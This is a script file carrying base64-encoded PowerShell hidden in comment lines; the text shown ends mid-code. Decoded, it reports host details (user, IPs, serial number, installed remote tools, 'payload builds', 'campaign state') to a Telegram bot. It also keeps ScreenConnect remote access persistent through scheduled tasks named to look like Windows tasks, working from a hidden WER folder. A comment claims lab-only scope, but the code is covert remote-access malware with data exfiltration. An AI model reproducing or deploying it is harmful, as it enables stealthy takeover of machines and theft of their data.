::PnswfTwvY29kZT4nIC1mIChFc2MgKCRfIC1yZXBsYWNlICdbXlx4MjAtXHg3RV0n
::LCAnPycpKSkpIH0NCiAgICB9DQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVx
::IDApIHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBt
::YXJrZXJzIGluIGJvb3QuZXJyKScpIH0NCiAgICAkZGVwbG95QmxvY2sgPSBAIg0K
::DQo8Yj5EZXBsb3kgdmVyZGljdDwvYj4NCi0gUmVzdWx0OiA8Yj4kKEVzYyAkdmVy
::ZGljdCk8L2I+DQotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHByaW1PaykgeyAn
::WUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNo
::ZVxvd25fbW9uLmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsg
::J05PJyB9KQ0KLSBCYWNrdXAgbW9uICguZXRsY2FjaGVcZXRsX21vbi5jbWQpOiAk
::KGlmICgkaGFzRXRsKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0gUGVyc2lz
::dCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVjdGVkVGFza3MuQ291bnQpIChi
::YWQvbWlzc2luZzogJHRhc2tCYWQpDQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
::emUpDQotIEZvcmVpZ24gU0MgZm9sZGVycyBsZWZ0OiAkKCRmb3JlaWduLkNvdW50
::KQ0KLSBOb3RlOiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBydW4g
::KG5vcm1hbCByaWdodCBhZnRlciBjcmVhdGUpDQoNCjxiPkRlcGxveSBsb2cgbWFy
::a2VyczwvYj4NCiQoJGRpYWdMaW5lcyAtam9pbiAiYG4iKQ0KIkANCn0NCg0KJGdk
::cm9wQmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdHRFJPUCcpIHsNCiAgICAkY2F1
::c2VQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdkcm9wX2xhc3RfcmVhc29uLnR4
::dCcNCiAgICAkY2F1c2UgPSBpZiAoVGVzdC1QYXRoICRjYXVzZVBhdGgpIHsgKEdl
::dC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2F1c2VQYXRoIC1Ub3RhbENvdW50IDEp
::IH0gZWxzZSB7ICRTdW1tYXJ5IH0NCiAgICAkZXZMaW5lcyA9IE5ldy1PYmplY3Qg
::U3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGV2
::RGlyID0gSm9pbi1QYXRoICRXb3JrRGlyICdkcm9wX2V2ZW50cycNCiAgICAkbGF0
::ZXN0ID0gJG51bGwNCiAgICBpZiAoVGVzdC1QYXRoICRldkRpcikgew0KICAgICAg
::ICAkbGF0ZXN0ID0gR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGV2RGlyIC1G
::aWx0ZXIgJ2Ryb3BfKi50eHQnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::IHwNCiAgICAgICAgICAgIFNvcnQtT2JqZWN0IExhc3RXcml0ZVRpbWUgLURlc2Nl
::bmRpbmcgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIGlmICgk
::bGF0ZXN0KSB7DQogICAgICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbGF0
::ZXN0LkZ1bGxOYW1lIC1Ub3RhbENvdW50IDQ1IC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlIHwNCiAgICAgICAgICAgIEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRd
::JGV2TGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+JyAtZiAoRXNjICgoJF8g
::LXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkpIH0NCiAgICB9DQogICAg
::aWYgKCRldkxpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRldkxpbmVzLkFkZCgn
::LSAobm8gZHJvcF9ldmVudHMgZmlsZSB5ZXQpJykgfQ0KICAgICRnZHJvcEJsb2Nr
::ID0gQCINCg0KPGI+U0MgRFJPUCBjYXVzZTwvYj4NCi0gQ0FVU0U6IDxiPiQoRXNj
::ICRjYXVzZSk8L2I+DQotIEV2aWRlbmNlIGZpbGU6IDxjb2RlPiQoRXNjICQoaWYg
::KCRsYXRlc3QpIHsgJGxhdGVzdC5GdWxsTmFtZSB9IGVsc2UgeyAnbi9hJyB9KSk8
::L2NvZGU+DQoNCjxiPkV2aWRlbmNlIChmaXJzdCBsaW5lcyk8L2I+DQokKCRldkxp
::bmVzIC1qb2luICJgbiIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1vamkgPGI+
::U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+DQoNCjxiPkV2ZW50PC9iPg0K
::LSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkNCi0gVHJhbnNpdGlvbjogPGNvZGU+
::JChFc2MgJHRyYW5zKTwvY29kZT4NCi0gV2hlbjogJChFc2MgJG5vdykNCi0gU291
::cmNlIGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPg0KJGRlcGxveUJs
::b2NrJGdkcm9wQmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2Rl
::PiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+
::JChFc2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTog
::JGlzU3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4p
::DQoNCjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4p
::PC9jb2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9jb2RlPg0K
::DQo8Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24p
::DQotIFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9z
::LkJ1aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5J
::bnN0YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0g
::VXB0aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5DUFUpDQot
::IEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9k
::ZWwpDQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+DQot
::IFJBTTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlz
::a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+
::U2NyZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2MDEwNTc5
::ODUyZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxjb2RlPmY4
::NjFjODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCiQoJHNjTGlz
::dCAtam9pbiAiYG4iKQ0KDQo8Yj5PdGhlciBSTU0gLyByZW1vdGUgdG9vbHM8L2I+
::DQokKCRybW1IaXRzIC1qb2luICJgbiIpDQoNCjxiPlBlcnNpc3QgdGFza3MgKGV4
::cGVjdGVkKTwvYj4NCiQoJHRhc2tMaW5lcyAtam9pbiAiYG4iKQ0KDQo8Yj5DYWNo
::ZTwvYj4NCi0gTVNJIGNhY2hlOiAkKEVzYyAkbXNpU2l6ZSkNCi0gV29ya0Rpcjog
::PGNvZGU+JChFc2MgJFdvcmtEaXIpPC9jb2RlPg0KDQo8Yj5QYXlsb2FkIGJ1aWxk
::cyAoaW5zdGFsbGVkIG9uIHRoaXMgaG9zdCk8L2I+DQotIDxjb2RlPk1PTj0kYk1v
::biB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4NCg0K
::PGI+Q2FtcGFpZ24gc3RhdGU8L2I+DQotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUp
::PC9jb2RlPg0KDQo8aT5Cb3Q6IEBub2J1ZGR5cm1tQm90IHwgVEdfUkVQT1JUICRi
::VGdyPC9pPg0KIkANCg0KIyBjb21wYWN0IGRpZ2VzdCBtb2RlOiBvbmUgc2hvcnQg
::bGluZSwgSFRNTC1mcmVlIChob3VybHkgaGVhcnRiZWF0KQ0KaWYgKCRNb2RlIC1l
::cSAnY29tcGFjdCcpIHsNCiAgICAkZm9yZWlnbk4gPSAwDQogICAgaWYgKCRzdGF0
::ZU9iaiAtYW5kICRzdGF0ZU9iai5mb3JlaWduKSB7ICRmb3JlaWduTiA9IEAoJHN0
::YXRlT2JqLmZvcmVpZ24pLkNvdW50IH0NCiAgICAkbXNpU2hvcnQgPSBpZiAoVGVz
::dC1QYXRoICRtc2lDYWNoZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1z
::aUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8gMUtCKSB9IGVsc2UgeyAnMCcgfQ0KICAg
::ICRwcmltU2hvcnQgPSBpZiAoJHByaW1PaykgeyAnT0snIH0gZWxzZSB7ICdET1dO
::JyB9DQogICAgJGFsdFNob3J0ID0gaWYgKCRhbHRMaW5lIC1saWtlICdSdW5uaW5n
::KicpIHsgJ09LJyB9IGVsc2UgeyAnLScgfQ0KICAgICR0ZXh0ID0gIiRlbW9qaSBT
::Q0R8JCgkZW52OkNPTVBVVEVSTkFNRSl8c2V2PSRwcmltU2hvcnR8YWx0PSRhbHRT
::aG9ydHxmPSRmb3JlaWduTnx0PSR0YXNrT2svNHxiPSRCdWlsZCINCn0NCg0KaWYg
::KCR0ZXh0Lkxlbmd0aCAtZ3QgMzgwMCkgew0KICAgICRybW1IaXRzID0gQCgoJHJt
::bUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxMikpICsgKCctIC4uLiAoezB9
::IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpDQogICAgJHNjTGlzdCA9
::IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4u
::LiAoezB9IG1vcmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkNCiAgICAkdGV4
::dCA9ICR0ZXh0LlN1YnN0cmluZygwLCAzODAwKSArICJgbmBuPGk+VFJVTkNBVEVE
::IChUZWxlZ3JhbSA0MDk2IGxpbWl0KTwvaT4iDQp9DQoNCiRsb2cgPSBKb2luLVBh
::dGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0KZnVuY3Rpb24gU2VuZC1UZyhbc3RyaW5n
::XSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkcGF5bG9hZCA9IEB7DQogICAg
::ICAgIGNoYXRfaWQgICAgICAgICAgICAgICAgICA9ICRjZmcuQ0hBVF9JRA0KICAg
::ICAgICB0ZXh0ICAgICAgICAgICAgICAgICAgICAgPSAkbXNnDQogICAgICAgIGRp
::c2FibGVfd2ViX3BhZ2VfcHJldmlldyA9ICR0cnVlDQogICAgfQ0KICAgIGlmICgk
::bW9kZSkgeyAkcGF5bG9hZC5wYXJzZV9tb2RlID0gJG1vZGUgfQ0KICAgICRqc29u
::ID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRoIDUN
::CiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5
::dGVzKCRqc29uKQ0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgKCJodHRwczov
::L2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3Nh
::Z2UiKSBgDQogICAgICAgIC1NZXRob2QgUG9zdCAtQm9keSAkYnl0ZXMgLUNvbnRl
::bnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04JyB8IE91dC1O
::dWxsDQp9DQoNCmZ1bmN0aW9uIFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0
::cmluZ10kbW9kZSkgew0KICAgICR0b1NlbmQgPSAkbXNnDQogICAgdHJ5IHsNCiAg
::ICAgICAgU2VuZC1UZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1vZGUNCiAgICAgICAg
::cmV0dXJuICR0cnVlDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRyeSB7DQogICAg
::ICAgICAgICBTZW5kLVRnIC1tc2cgKCR0b1NlbmQuU3Vic3RyaW5nKDAsIDMwMDAp
::ICsgImBuPGk+VFJVTkNBVEVEPC9pPiIpIC1tb2RlICRtb2RlDQogICAgICAgICAg
::ICByZXR1cm4gJHRydWUNCiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICBy
::ZXR1cm4gJGZhbHNlDQogICAgICAgIH0NCiAgICB9DQp9DQoNCnRyeSB7DQogICAg
::aWYgKFNlbmQtVGdTYWZlIC1tc2cgJHRleHQgLW1vZGUgJ0hUTUwnKSB7DQogICAg
::ICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAndGdfc2Vu
::dF9yaWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gZWxz
::ZSB7DQogICAgICAgIHRocm93ICdodG1sX2ZhaWxlZCcNCiAgICB9DQogICAgaWYg
::KCRrZXkgLWVxICdERVBMT1knKSB7DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRl
::cmFsUGF0aCAkbG9nIC1WYWx1ZSAoInRnX2RlcGxveV9vaz0iICsgJGRlcGxveU9r
::KSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBTZXQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnZGVwbG95X3Rn
::LmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0NCn0gY2F0Y2ggew0KICAgIHRyeSB7
::DQogICAgICAgICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+
::XSs+JywgJycpDQogICAgICAgICRwbGFpbiA9IFtTeXN0ZW0uTmV0LldlYlV0aWxp
::dHldOjpIdG1sRGVjb2RlKCRwbGFpbikNCiAgICAgICAgaWYgKCRwbGFpbi5MZW5n
::dGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0cmluZygwLCAzNTAw
::KSArICJgblRSVU5DQVRFRCIgfQ0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNnICRw
::bGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsDQogICAgICAgIEFkZC1Db250ZW50IC1M
::aXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAndGdfc2VudF9wbGFpbicgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgQWRk
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZmFpbCAiICsg
::JF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlDQogICAgfQ0KfQ0K
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNTANCiMgTDUwOiBzZXZyei1vbmx5IGtlZXBlcnMvdGFza3Mvc3RhdGUvTVNJ
::IGhlbHBlcnMuDQojIFNoYXJlZCBsaWJyYXJ5OiBwZXItaG9zdCBpZGVudGl0eSwg
::V01JIHdhdGNoZG9nLCBjYW1wYWlnbiBzdGF0ZSwgU0MgcmVwYWlyLg0KIyBBdXRo
::b3JpemVkIGludGVybmFsIGRlcGxveW1lbnQgLSBsYWIvY29tcGV0aXRpb24gc2Nv
::cGUgb25seS4NCiMg4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQDQpbQ21kbGV0QmluZGluZygpXQ0KcGFyYW0oDQogICAgW1BhcmFt
::ZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldDQogICAgW1ZhbGlkYXRlU2V0KCdpbml0
::JywgJ3dhdGNoZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICd0YXNrcy1lbnN1cmUn
::LCAnc3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3JlZ2lzdGVyZWQnLCAn
::ZXh0ZXJtaW5hdGUnLCAndGVzdC1tc2knLCAncHJvdGVjdC1tc2knLCAndmVyaWZ5
::LXVwZGF0ZScsICdzeW5jLXNldnJ6LWZwJyldDQogICAgW3N0cmluZ10kQWN0aW9u
::LA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURhdGFcTWljcm9z
::b2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtzdHJpbmddJE1v
::blBhdGggPSAnJywNCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1JywNCiAgICBb
::c3RyaW5nXSRFeHRyYSAgPSAnJywNCiAgICBbc3RyaW5nXSRGcCAgICAgPSAnJywN
::CiAgICBbc3dpdGNoXSREZWVwLA0KICAgIFtzd2l0Y2hdJEZvcmNlLA0KICAgIFtz
::d2l0Y2hdJE5vV2FpdA0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1Np
::bGVudGx5Q29udGludWUnDQokY2ZnUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::aWRlbnRpdHkuY2ZnJw0KJElkZW50VmVyc2lvbiA9IDgNCg0KIyBSb290LWxldmVs
::IG5hbWVzIFdJVEhPVVQgbGVhZGluZyBiYWNrc2xhc2ggKG1hdGNoZXMgd29ya2lu
::ZyBXdWNhY2hlT3duIHN0eWxlKS4NCiRQb29scyA9IEB7DQogICAgQSA9IEAoJ1dl
::clF1ZXVlU3luYycsJ0RpYWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNhY2hlJywnV2Rp
::SG9zdFByb3h5JywnUGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25mbGljdFJlcycs
::J1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykNCiAgICBCID0gQCgnUGxh
::U2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnV2VyUXVldWVTeW5jJywnTmV0
::VHJhY2VDYWNoZScsJ0RpYWdIb3N0Q2FjaGUnLCdUY3BJcENvbmZsaWN0UmVzJywn
::UGxhU2VydmVyRGlhZycsJ1NyQ2FjaGVTeW5jJykNCiAgICBDID0gQCgnUmVzb2x1
::dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdX
::ZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9zdENhY2hlJywn
::UGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpDQogICAgRCA9IEAoJ1RjcElw
::Q29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNhY2hlJywn
::RGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1ZVN5bmMnLCdQ
::bGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknKQ0KfQ0KJERlZmF1bHRzID0g
::W29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnV2VyUXVldWVTeW5jJw0KICAgIFRB
::U0tfQiA9ICdQbGFTZXJ2ZXJIZWFsdGgnDQogICAgVEFTS19DID0gJ1dkaUhvc3RQ
::cm94eScNCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycNCiAgICBNT19B
::ICAgPSAnMicNCiAgICBNT19CICAgPSAnMycNCn0NCg0KZnVuY3Rpb24gR2V0LUhv
::c3RTZWVkIHsNCiAgICAkcyA9IDBMDQogICAgZm9yZWFjaCAoJGMgaW4gJGVudjpD
::T01QVVRFUk5BTUUuVG9VcHBlcigpLlRvQ2hhckFycmF5KCkpIHsgJHMgPSAoJHMg
::KiAzMSArIFtpbnRdJGMpICUgMTAwMDAwMDAwNyB9DQogICAgcmV0dXJuICRzDQp9
::DQoNCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgew0KICAgICRpZCA9ICREZWZhdWx0
::cy5DbG9uZSgpDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgew0KICAgICAg
::ICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRj
::ZmdQYXRoIC1Gb3JjZSkpIHsNCiAgICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2gg
::J15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNb
::MV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVy
::biAkaWQNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3RyaW5nXSR0
::bikgew0KICAgIGlmICgkdG4pIHsgJiBzY2h0YXNrcy5leGUgL0RlbGV0ZSAvVE4g
::JHRuIC9GIDI+JjEgfCBPdXQtTnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEdldC1UYXNr
::VmVyYm9zZUJsb2IoW3N0cmluZ10kdG4pIHsNCiAgICBpZiAoLW5vdCAkdG4pIHsg
::cmV0dXJuICcnIH0NCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9U
::TiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RF
::IC1uZSAwIC1vciAtbm90ICRvdXQpIHsgcmV0dXJuICcnIH0NCiAgICByZXR1cm4g
::KCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIpDQp9
::DQoNCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10kdG4sIFtzdHJp
::bmddJG1hcmtlcikgew0KICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBzY2hlZHVsZWQg
::YWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBub3QgYSBXaW5k
::b3dzIENPTSBoYW5kbGVyLg0KICAgICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxv
::YiAkdG4NCiAgICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZhbHNlIH0NCiAg
::ICBpZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBl
::KCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGlmICgkYmxvYiAtbWF0
::Y2ggJyg/aSlcLnd1Y2FjaGVcXHxvd25fbW9uXC5jbWR8ZXRsX21vblwuY21kfFwu
::ZXRsY2FjaGVcXCcpIHsgcmV0dXJuICR0cnVlIH0NCiAgICByZXR1cm4gJGZhbHNl
::DQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0KICAgICMgSWRl
::bXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4gUG9vbCB1cGdy
::YWRlcyBidW1wIElERU5UVkVSOg0KICAgICMgb3duZWQgb2xkLW5hbWUgdGFza3Mg
::YXJlIGRlbGV0ZWQ7IFdpbmRvd3MgYnVpbHQtaW5zIHdpdGggc2FtZSBuYW1lIGFy
::ZSBsZWZ0IGFsb25lLg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsNCiAg
::ICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkNCiAgICAgICAgIyBMNzogYWxzbyBy
::ZWdlbmVyYXRlIGlmIGFueSBUQVNLXyogaXMgZW1wdHkgKEw0LUw2IG1vZHVsby9j
::YXN0IGJ1Z3MgbGVmdCBibGFuayBzbG90cykNCiAgICAgICAgJHNsb3RzT2sgPSAo
::JG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAtYW5kICRvbGRb
::J1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xkWydUQVNLX0Mn
::XSAtYW5kICRvbGRbJ1RBU0tfRCddDQogICAgICAgIGlmICgkc2xvdHNPaykgeyBy
::ZXR1cm4gJG9sZCB9DQogICAgICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdU
::QVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7DQogICAgICAgICAgICAkdG4gPSBb
::c3RyaW5nXSRvbGRbJGtdDQogICAgICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29u
::dGludWUgfQ0KICAgICAgICAgICAgIyBOZXZlciBkZWxldGUgYSByZWFsIFdpbmRv
::d3MgdGFzayB3ZSBuZXZlciBvd25lZCAoVFIgaXMgQ09NL2N1c3RvbSBoYW5kbGVy
::KS4NCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykgeyBS
::ZW1vdmUtVGFza1F1aWV0ICR0biB9DQogICAgICAgIH0NCiAgICAgICAgUmVtb3Zl
::LUl0ZW0gLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZQ0KICAgIH0NCiAgICAk
::cyA9IEdldC1Ib3N0U2VlZA0KICAgICMgTDQ6IHR3byBzbG90cyBtYXkgaGFzaCB0
::byB0aGUgc2FtZSB0YXNrIHBhdGggKHBvb2xzIHNoYXJlIG5hbWVzKSAtPg0KICAg
::ICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdvIHNsb3RzIGFu
::ZCB0aGUgZmxlZXQgc2hvd3MgMy80Lg0KICAgICMgV2FsayBlYWNoIHBvb2wgZm9y
::d2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNsb3RzLg0KICAg
::ICMgTDY6IHRoZSBvbGQgQChAKCdBJywgJHMgJSA4KSwgLi4uKSBmb3JtIHdhcyBk
::b3VibGUtYnJva2VuIGluIFBTIDUuMToNCiAgICAjIGJhcmUgJSBpbnNpZGUgQCgp
::IHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5vdCBtb2R1bG8p
::LCBzbyB0aGUNCiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFuZCB0aGUgbG9v
::cCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQ0KICAgICMgVEFT
::S18qIGFuZCB0aGUgd2hvbGUgZmxlZXQgZmVsbCBiYWNrIHRvIGlkZW50aWNhbCBk
::ZWZhdWx0IHRhc2sgbmFtZXMuDQogICAgJHNlZWRzID0gW29yZGVyZWRdQHsNCiAg
::ICAgICAgQSA9ICgkcyAlIDgpDQogICAgICAgIEIgPSAoKCRzICsgMykgJSA4KQ0K
::ICAgICAgICBDID0gKCgkcyArIDUpICUgOCkNCiAgICAgICAgRCA9ICgoJHMgKyA3
::KSAlIDgpDQogICAgfQ0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9DQogICAgZm9y
::ZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsNCiAgICAgICAgJGkg
::PSBbaW50XSRzZWVkc1skbGV0dGVyXQ0KICAgICAgICAkbmFtZSA9ICRQb29sc1sk
